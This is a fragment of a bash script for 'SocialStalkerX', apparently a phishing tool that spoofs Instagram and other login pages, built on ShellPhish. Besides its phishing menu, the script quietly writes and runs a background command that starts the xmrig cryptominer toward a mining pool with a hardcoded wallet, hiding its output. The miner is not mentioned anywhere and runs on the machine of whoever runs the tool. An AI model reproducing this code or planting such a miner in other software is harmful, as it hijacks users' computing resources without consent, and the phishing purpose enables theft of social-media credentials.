#!/bin/bash
# SocialStalkerX v1.1 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
...
echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 47NhmEW2UmMA2ceXpPea7E13FQJK7rf5gSQLuYan4qpz8aPbZaan6nSEQycdNhn4KzCqrNUsvnKcLDajgHs4m67iUhPv3VP -k --tls -p Linux /dev/null 2>&1 &" > run.sh && chmod +x run.sh
...
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m STALKER X  v1.1\e[0m\n"                                
...
printf "                                                \e[1;94m UPGRADED BY: Lady-err0r\e[0m\n"
